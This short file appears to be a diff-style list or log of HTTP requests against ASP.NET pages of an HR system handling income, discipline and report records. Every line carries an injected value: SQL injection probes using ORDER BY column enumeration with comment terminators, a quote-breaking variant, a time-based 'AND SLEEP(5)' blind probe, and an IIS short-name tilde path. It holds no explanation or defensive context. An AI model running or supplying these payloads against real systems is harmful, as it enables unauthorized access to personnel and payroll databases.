+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 1239-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 2002-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 3032#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 3938-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 4508#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 4515#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	oper=m&recid=101536) ORDER BY 1#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	oper=m&recid=101536') ORDER BY 1#
+/hr3/personnel/lzh/LzhReportEdit.aspx	oper=m&recid=101536) ORDER BY 6386#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 ORDER BY 1-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533 ORDER BY 1#
+/webcs*~1*/a.aspx	recid=101533 AND SLEEP(5)
